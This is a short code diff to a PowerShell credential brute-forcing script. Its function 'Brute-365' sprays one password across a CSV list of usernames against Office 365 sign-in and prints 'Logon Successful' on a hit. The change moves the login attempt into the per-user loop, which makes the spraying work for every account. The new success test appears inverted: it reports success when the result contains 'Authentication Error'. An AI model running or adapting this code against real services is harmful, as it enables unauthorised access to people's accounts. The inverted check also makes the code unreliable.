@@ -34,17 +34,17 @@ function Brute-365 {
     $usernames = Import-CSV $csv
     foreach($user in $usernames) {
       $username = $($user.Username)
+      $secpasswd = ConvertTo-SecureString $password -AsPlainText -Force
+      $mycreds = New-Object System.Management.Automation.PSCredential ($username, $secpasswd)
+      $connect = Connect-MsolService -Credential $mycreds
+      if ($connect -contains 'Authentication Error') {
+        Write-Output "Logon Successful for $username"
+        if ($Beep) {
+          [console]::beep(2000,500)
+        }
+      }
     } 
   } 
-  $secpasswd = ConvertTo-SecureString $password -AsPlainText -Force
-  $mycreds = New-Object System.Management.Automation.PSCredential ($username, $secpasswd)
-  $connect = Connect-MsolService -Credential $mycreds
-  if ($connect -eq $null) {
-      Write-Output "Logon Successful for $username"
-      if ($Beep) {
-        [console]::beep(2000,500)
-      }
-  }
 } 
   function Brute-OWA  {
       <#
